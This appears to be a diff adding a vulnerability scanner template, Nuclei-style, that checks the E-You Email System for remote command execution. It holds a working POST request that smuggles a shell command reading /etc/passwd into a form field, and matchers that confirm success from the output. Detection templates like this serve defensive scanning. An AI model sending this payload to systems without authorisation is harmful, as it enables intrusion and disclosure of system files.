@@ -1,0 +1,27 @@
+id: e-you-email-system-rce
+info:
+  name: E-You Email System Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: rce
+  description: |
+    Remote Command Execution vulnerability in E-You Email System that allows an attacker to execute arbitrary commands on the server.
+http:
+  - raw:
+      - |
+        POST /webadm/?q=moni_detail.do&action=gragh HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        type='|cat /etc/passwd||'
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: regex
+        part: body
+        regex:
+          - "var _location = window\\.location;"
